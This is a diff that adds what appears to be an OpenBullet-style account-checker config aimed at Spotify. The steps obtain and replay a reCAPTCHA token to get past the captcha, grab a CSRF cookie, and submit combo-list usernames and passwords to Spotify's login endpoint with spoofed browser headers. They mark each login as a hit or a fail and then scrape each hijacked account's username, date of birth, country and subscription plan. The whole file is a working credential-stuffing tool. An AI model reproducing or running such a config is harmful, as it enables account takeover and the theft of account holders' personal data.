@@ -1,0 +1,156 @@
+BLOCK:UrlEncode
+LABEL:EncodeUSER
+  input = @input.USER
+  => VAR @US
+ENDBLOCK
+
+BLOCK:UrlEncode
+LABEL:EncodePASS
+  input = @input.PASS
+  => VAR @PS
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:Get
+  url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=iSHzt4kCrNgSxGUYDFqaZAL9&size=invisible&cb=q7o50gyglw4p"
+  customHeaders = {("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"), ("accept-encoding", "gzip, deflate, br"), ("accept-language", "en-US,en;q=0.9,fa;q=0.8"), ("Pragma", "no-cache"), ("sec-fetch-dest", "document"), ("sec-fetch-mode", "navigate"), ("sec-fetch-site", "none"), ("sec-fetch-user", "?1"), ("upgrade-insecure-requests", "1"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36")}
+  TYPE:STANDARD
+  $""
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:Recaptcha Token
+  input = @data.SOURCE
+  cssSelector = "#recaptcha-token"
+  attributeName = "value"
+  MODE:CSS
+  => VAR @Token
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:Post Token
+  url = "https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39"
+  method = POST
+  customHeaders = {("accept", "*/*"), ("accept-encoding", "gzip, deflate, br"), ("accept-language", "en-US,en;q=0.9,fa;q=0.8"), ("Pragma", "no-cache"), ("origin", "https://www.google.com"), ("referer", "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=iSHzt4kCrNgSxGUYDFqaZAL9&size=invisible&cb=q7o50gyglw4p"), ("sec-fetch-dest", "empty"), ("sec-fetch-mode", "cors"), ("sec-fetch-site", "same-origin"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36")}
+  TYPE:STANDARD
+  $"v=iSHzt4kCrNgSxGUYDFqaZAL9&reason=q&c=<Token>&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ"
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:RRESP
+  input = @data.SOURCE
+  leftDelim = "[\"rresp\",\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @rresp
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:Get
+  url = "https://accounts.spotify.com/en/login"
+  TYPE:STANDARD
+  $""
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:Get
+  url = "https://www.spotify.com/us/"
+  TYPE:STANDARD
+  $""
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:CSRF
+  input = @data.COOKIES["csrf_token"]
+  MODE:LR
+  => VAR @CSRF
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:Login
+  url = "https://accounts.spotify.com/login/password"
+  method = POST
+  customCookies = ${("LPVID", "gzYjc2YzNjZTg1MDk4ODY2"), ("_gcl_au", "1.1.856762758.1613076091"), ("_scid", "7e028674-f589-4d7c-aba8-718d86dd1256"), ("_fbp", "fb.1.1613076098506.1959951721"), ("_pin_unauth", "dWlkPU0yTmtaR1ZqTnpNdE1HRTROaTAwWXpZM0xXRm1OR1F0TnpNd01XTTBOMlZrWlRkag"), ("spot", "%7B%22t%22%3A1613076076%2C%22m%22%3A%22us%22%2C%22p%22%3Anull%7D"), ("sp_last_utm", "%7B%22utm_campaign%22%3A%22your_account%22%2C%22utm_medium%22%3A%22menu%22%2C%22utm_source%22%3A%22spotify%22%7D"), ("_rdt_uuid", "1613076966098.d630ec23-64aa-449f-8b88-401222d8ba05"), ("_hjid", "bbbb656f-dd94-40f2-957a-53a4301122e2"), ("_gaexp", "GAX1.2.sTt7tRcOS3KMD55wvPnszw.18749.1"), ("OptanonAlertBoxClosed", "02/12/2021 11:00:17"), ("__bon", "MHwwfDU3NTkwMDM1NHwyNDE4NzgxNDg2OHwxfDF8MXwx"), ("_gid", "GA1.2.947342898.1615229344"), ("remember", "<US>"), ("sp_ac", "AQChnn9TBmMImYL4P-O_2yUdZawyEPuStZ-nBWu6cvAeUi6Kj3pLPpa54HWJvtFgCdWLllBZsnB5BmZbX9gekhry4ZKMe5C0-7u5WYTrNl-_H5K841NbgmW0zvILxw4c8zr22st6th4gN1tHfm57evyciF0BQS6MbMVxuWxmYoqFv_yX9pU2WEKwKJLRknOI92X_seUZvzhNitlzNL8_ro4uiKIGAsNzBjv15-aH"), ("OptanonConsent", "isIABGlobal=false&datestamp=Mon+Mar+08+2021+22%3A21%3A05+GMT%2B0330+(Iran+Standard+Time)&version=6.13.0&hosts=&consentId=1fb9ee28-fa7f-45a9-823b-70f5b6c7e043&interactionCount=1&landingPath=NotLandingPage&groups=t00%3A1%2Cs00%3A1%2Cf00%3A1%2Cm00%3A1%2Ci00%3A1&AwaitingReconsent=false&geolocation=US%3B"), ("_gat_UA-5784146-31", "1"), ("_sctr", "1|1615149000000"), ("_ga", "GA1.2.114573345.1613075966"), ("_ga_S35RN5WNT2", "GS1.1.1615229473.3.0.1615229488.45"), ("_gat", "1")}
+  customHeaders = {("accept", "application/json, text/plain, */*"), ("accept-encoding", "gzip, deflate, br"), ("accept-language", "en-US,en;q=0.9,fa;q=0.8"), ("origin", "https://accounts.spotify.com"), ("referer", "https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect%3Flocale%3Dus&_locale=en-US"), ("sec-ch-ua", "\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\""), ("sec-ch-ua-mobile", "?0"), ("sec-fetch-dest", "empty"), ("sec-fetch-mode", "cors"), ("sec-fetch-site", "same-origin"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36")}
+  TYPE:STANDARD
+  $"remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect%3Flocale%3Dus&username=<US>&password=<PS>&recaptchaToken=<rresp>&csrf_token=<CSRF>"
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:Keycheck
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.SOURCE Contains "{\"error\":\"errorInvalidCredentials\"}"
+  KEYCHAIN SUCCESS OR
+    STRINGKEY @data.SOURCE Contains "{\"result\":\"ok\""
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:Get Profile
+  url = "https://www.spotify.com/us/api/account/overview/"
+  customHeaders = {("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"), ("accept-encoding", "gzip, deflate, br"), ("accept-language", "en-US,en;q=0.9,fa;q=0.8"), ("cache-control", "max-age=0"), ("sec-fetch-dest", "document"), ("sec-fetch-mode", "navigate"), ("sec-fetch-site", "none"), ("sec-fetch-user", "?1"), ("upgrade-insecure-requests", "1"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36")}
+  TYPE:STANDARD
+  $""
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:Username
+  input = @data.SOURCE
+  leftDelim = "{\"label\":\"Username\",\"value\":\""
+  rightDelim = "\"}"
+  MODE:LR
+  => CAP @Username
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:Get Birth
+  input = @data.SOURCE
+  leftDelim = "{\"label\":\"Date of birth\",\"value\":\""
+  rightDelim = "\"}"
+  MODE:LR
+  => VAR @DateOfBirth
+ENDBLOCK
+
+BLOCK:Replace
+LABEL:Date Of Birth
+  original = @DateOfBirth
+  toReplace = "\\/"
+  replacement = "/"
+  => CAP @DateOfBirth
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:Country Cod
+  input = @data.SOURCE
+  leftDelim = "{\"label\":\"Country\",\"value\":\""
+  rightDelim = "\"}"
+  MODE:LR
+  => VAR @CountryCod
+ENDBLOCK
+
+BLOCK:Translate
+LABEL:Country
+  input = @CountryCod
+  translations = {("US", "United States"), ("CA", "Canada"), ("GB", "United Kingdom"), ("AU", "Australia"), ("SE", "Sweden"), ("ES", "Spain"), ("FR", "France"), ("IT", "Italy"), ("DE", "Germany"), ("NL", "Netherlands"), ("PL", "Poland"), ("NO", "Norway"), ("BR", "Brazil"), ("CH", "Switzerland"), ("TR", "Turkey"), ("IN", "India"), ("IE", "Ireland"), ("MX", "Mexico"), ("DK", "Denmark"), ("FI", "Finland"), ("AT", "Austria"), ("RU", "Russian Federation"), ("UA", "Ukraine"), ("BE", "Belgium"), ("BG", "Bulgaria"), ("SK", "Slovakia"), ("SI", "Slovenia"), ("RO", "Romania"), ("PT", "Portugal"), ("LV", "Latvia"), ("LI", "Liechtenstein"), ("LT", "Lithuania"), ("LU", "Luxembourg"), ("AN", "Netherlands antilles"), ("HR", "Croatia"), ("CY", "Cyprus"), ("CZ", "Czech Republic"), ("EE", "Estonia"), ("HU", "Hungary"), ("IS", "Iceland"), ("GR", "Greece"), ("AF", "Afghanistan"), ("AL", "Albania"), ("DZ", "Algeria"), ("AS", "American Samoa"), ("AD", "Andorra"), ("AO", "Angola"), ("AI", "Anguilla"), ("AQ", "Antarctica"), ("AG", "Antigua & Barbuda"), ("AR", "Argentina"), ("AM", "Armenia"), ("AW", "Aruba"), ("AZ", "Azerbaijan"), ("BS", "Bahamas"), ("BH", "Bahrain"), ("BD", "Bangladesh"), ("BB", "Barbados"), ("BY", "Belarus"), ("BZ", "Belize"), ("BJ", "Benin"), ("BM", "Bermuda"), ("BT", "Bhutan"), ("BO", "Bolivia"), ("BA", "Bosnia & Herzegovina"), ("BW", "Botswana"), ("BV", "Bouvet Island"), ("IO", "British Indian Ocean Territory"), ("BN", "Brunei Darussalam"), ("BF", "Burkina Faso"), ("BI", "Burundi"), ("KH", "Cambodia"), ("CM", "Cameroon"), ("CV", "Cape Verde"), ("KY", "Cayman Islands"), ("CF", "Central African Republic"), ("TD", "Chad"), ("CL", "Chile"), ("CN", "People's Republic Of China"), ("CX", "Christmas Island"), ("CC", "Cocos (Keeling) Islands"), ("CO", "Colombia"), ("KM", "Comoros"), ("CG", "Congo"), ("CD", "Congo, The Democratic Republic Of"), ("CK", "Cook Islands"), ("CR", "Costa Rica"), ("CI", "Côte D'Ivoire"), ("CU", "Cuba"), ("DJ", "Djibouti"), ("DM", "Dominica"), ("DO", "Dominican Republic"), ("EC", "Ecuador"), ("EG", "Egypt"), ("EH", "Western Sahara"), ("SV", "El Salvador"), ("GQ", "Equatorial Guinea"), ("ER", "Eritrea"), ("ET", "Ethiopia"), ("FK", "Falkland Islands (Malvinas)"), ("FO", "Faroe Islands"), ("FJ", "Fiji"), ("GF", "French Guiana"), ("PF", "French Polynesia"), ("TF", "French Southern Territories"), ("GA", "Gabon"), ("GM", "Gambia"), ("GE", "Georgia"), ("GH", "Ghana"), ("GI", "Gibraltar"), ("GL", "Greenland"), ("GD", "Grenada"), ("GP", "Guadeloupe"), ("GU", "Guam"), ("GT", "Guatemala"), ("GN", "Guinea"), ("GW", "Guinea-Bissau"), ("GY", "Guyana"), ("HT", "Haiti"), ("HM", "Heard Island & Mcdonald Islands"), ("HN", "Honduras"), ("HK", "Hong Kong"), ("ID", "Indonesia"), ("IR", "Iran, Islamic Republic Of"), ("IQ", "Iraq"), ("IL", "Israel"), ("JM", "Jamaica"), ("JP", "Japan"), ("JO", "Jordan"), ("KZ", "Kazakhstan"), ("KE", "Kenya"), ("KI", "Kiribati"), ("KP", "Korea, Democratic People's Republic Of"), ("KR", "Korea, Republic Of"), ("KW", "Kuwait"), ("KG", "Kyrgyzstan"), ("LA", "Lao People's Democratic Republic"), ("LB", "Lebanon"), ("LS", "Lesotho"), ("LR", "Liberia"), ("LY", "Libyan Arab Jamahiriya"), ("MO", "Macao"), ("MK", "Macedonia, The Former Yugoslav Republic Of"), ("MG", "Madagascar"), ("MW", "Malawi"), ("MY", "Malaysia"), ("MV", "Maldives"), ("ML", "Mali"), ("MT", "Malta"), ("MH", "Marshall Islands"), ("MQ", "Martinique"), ("MR", "Mauritania"), ("MU", "Mauritius"), ("YT", "Mayotte"), ("FM", "Micronesia, Federated States Of"), ("MD", "Moldova, Republic Of"), ("MC", "Monaco"), ("MN", "Mongolia"), ("MS", "Montserrat"), ("MA", "Morocco"), ("MZ", "Mozambique"), ("MM", "Myanmar"), ("NA", "Namibia"), ("NR", "Nauru"), ("NP", "Nepal"), ("NC", "New Caledonia"), ("NZ", "New Zealand"), ("NI", "Nicaragua"), ("NE", "Niger"), ("NG", "Nigeria"), ("NU", "Niue"), ("NF", "Norfolk Island"), ("MP", "Northern Mariana Islands"), ("OM", "Oman"), ("PK", "Pakistan"), ("PW", "Palau"), ("PS", "Palestinian Territory, Occupied"), ("PA", "Panama"), ("PG", "Papua New Guinea"), ("PY", "Paraguay"), ("PE", "Peru"), ("PH", "Philippines"), ("PN", "Pitcairn"), ("PR", "Puerto Rico"), ("QA", "Qatar"), ("RE", "Réunion"), ("RW", "Rwanda"), ("SH", "Saint Helena"), ("KN", "Saint Kitts & Nevis"), ("LC", "Saint Lucia"), ("PM", "Saint Pierre & Miquelon"), ("VC", "Saint Vincent & The Grenadines"), ("WS", "Samoa"), ("SM", "San Marino"), ("ST", "Sao Tome & Principe"), ("SA", "Saudi Arabia"), ("SN", "Senegal"), ("CS", "Serbia & Montenegro"), ("SC", "Seychelles"), ("SL", "Sierra Leone"), ("SG", "Singapore"), ("SB", "Solomon Islands"), ("SO", "Somalia"), ("ZA", "South Africa"), ("GS", "South Georgia & South Sandwich Islands"), ("LK", "Sri Lanka"), ("SD", "Sudan"), ("SR", "Suriname"), ("SJ", "Svalbard & Jan Mayen"), ("SZ", "Swaziland"), ("SY", "Syrian Arab Republic"), ("TW", "Taiwan, Republic Of China"), ("TJ", "Tajikistan"), ("TZ", "Tanzania, United Republic Of"), ("TH", "Thailand"), ("TL", "Timor-Leste"), ("TG", "Togo"), ("TK", "Tokelau"), ("TO", "Tonga"), ("TT", "Trinidad & Tobago"), ("TN", "Tunisia"), ("TM", "Turkmenistan"), ("TC", "Turks & Caicos Islands"), ("TV", "Tuvalu"), ("UG", "Uganda"), ("AE", "United Arab Emirates"), ("UM", "United States Minor Outlying Islands"), ("UY", "Uruguay"), ("UZ", "Uzbekistan"), ("VE", "Venezuela"), ("VU", "Vanuatu"), ("VN", "Viet Nam"), ("VG", "British Virgin Islands"), ("VI", "U.S. Virgin Islands"), ("WF", "Wallis & Futuna"), ("YE", "Yemen"), ("ZW", "Zimbabwe")}
+  replaceOne = True
+  => CAP @Country
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:Plan
+  input = @data.SOURCE
+  leftDelim = "\"plan\":{\"name\":\""
+  rightDelim = "\""
+  MODE:LR
+  => CAP @Plan
+ENDBLOCK
+
+BLOCK:Keycheck
+  banIfNoMatch = False
+  KEYCHAIN CUSTOM OR
+    STRINGKEY @Plan Contains "Spotify Free"
+ENDBLOCK
